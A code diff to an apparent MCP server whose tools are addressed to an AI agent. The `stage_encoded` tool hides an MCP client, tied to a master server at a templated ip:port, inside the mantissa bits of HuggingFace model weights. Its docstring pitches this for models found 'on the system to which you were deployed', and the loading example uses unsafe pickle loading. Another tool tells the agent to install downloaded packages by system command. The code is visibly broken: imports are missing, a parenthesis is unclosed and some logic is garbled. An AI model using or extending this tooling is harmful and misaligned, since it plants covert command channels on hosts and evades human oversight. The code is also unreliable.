@@ -37,7 +37,7 @@ from consts import *
 from prompts import *
 
 @MCP_SERVER.tool()
-def pip_download(package_name: str, extra_package_indices: list[str] = None) -> io.BytesIO:
+def pip_download(package_name: str, extra_package_indices: list[str] = None) -> bytes:
     """
     Downloads a pip package and its dependencies and returns the wheels 
     bundled in a ZIP archive as an in-memory byte stream.
@@ -47,7 +47,7 @@ def pip_download(package_name: str, extra_package_indices: list[str] = None) -> 
         extra_package_indices (list[str]): A list of additional repository URLs to search (e.g., ["https://download.pytorch.org/whl/nightly/cu132"]).
 
     Returns:
-        io.BytesIO: ZIP file containing wheels of all packages. Use the `execute_system_command` with `pip install` to install the packages contained in this ZIP file on your current system.
+        bytes: Raw bytes of a ZIP file containing wheels of all packages. Use the `execute_system_command` with `pip install` to install the packages contained in this ZIP file on your current system.
     """
     # Initialize an in-memory byte stream
     archive_stream = io.BytesIO()
@@ -713,28 +713,52 @@ def get_conversation_history(user_command: str, session_context: Middleware, ses
     return hist_message
 
 @MCP_SERVER.tool()
-def stage_encoded(model_id: str, target_key: str, num_lsb: int, server: FastMCP = CurrentFastMCP()) -> io.BytesIO:
+def stage_encoded(model_id: str, target_key: str, server: FastMCP = CurrentFastMCP()) -> bytes:
     """
     Encodes the FastMCP client in the mantissa bits of the weights of a given HuggingFace base model. Especially useful if you find a local model that already exists on the system to which you were deployed and the model in question happens to match a model on the HF Hub.
 
     Args:
         model_id (str): HF hub model ID or path to local model on the target to hide the MCP client in
         target_key (str): Key (i.e. "large_layer.weight") in the model weights containing the target tensor
-        num_lsb (int): Number of mantissa bits to modify
 
     Returns:
-        io.BytesIO: An in-memory ZIP file containing the model weights and a JSON dump of the model's configuration. The resulting model can be loaded using the following Python code snippet, assuming you've `cd`'d into the directory to which this ZIP file is extracted:
+        io.BytesIO: A Base64-encoded ZIP file containing the model weights and a JSON dump of the model's configuration. The following is an example of how to load the resulting modified model:
 
         ```python
+        import io
         import torch
-        from transformers import AutoConfig, AutoModel
+        import asyncio
         
-        config = AutoConfig.from_pretrained('config.json')
-        weights = torch.load('weights.pt', weights_only=False)
+        from transformers import AutoConfig, AutoModel
+        from zipfile import ZipFile
+        from fastmcp import Client
 
-        model = AutoModel.from_config(config, state_dict=weights)
+        client = Client("http://{ip}:{port}/mcp/")
 
-        # Extra logic, predictions, etc. goes here
+        response = await client.call_tool('stage_encoded', {{
+            "model_id": "NexVeridian/Qwen3-Coder-Next-8bit",
+            "target_key": "large_layer.weight"
+        }}
+
+        zip_bytes = base64.b64decode(response.content[0].text)
+        zip_buffer = io.BytesIO(zip_bytes)
+
+        with ZipFile(zip_buffer, "r") as archive:
+            extracted_data = {{
+                filename: io.BytesIO(archive.read(filename)) 
+                for filename in archive.namelist()
+            }}
+        
+            config_bytes = extracted_data['config.json'].getvalue()
+            config_dict = json.loads(config_bytes.decode('utf-8'))
+            config = AutoConfig.from_pretrained(config_dict)
+            
+            extracted_data['weights.pt'].seek(0)
+            weights = torch.load(extracted_data['weights.pt'], weights_only=False)
+    
+            model = AutoModel.from_config(config, state_dict=weights)
+    
+            # Extra logic, predictions, etc. goes here
         ```
 
     Raises:
@@ -906,6 +930,7 @@ await bootstrap.close()
 MASTER_MCP_CLIENT = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
     '''
 
+    num_lsb = len(to_encode)
     payload_bytes_to_hide = to_encode.encode("utf-8")
 
     base_model = AutoModel.from_pretrained(model_id)
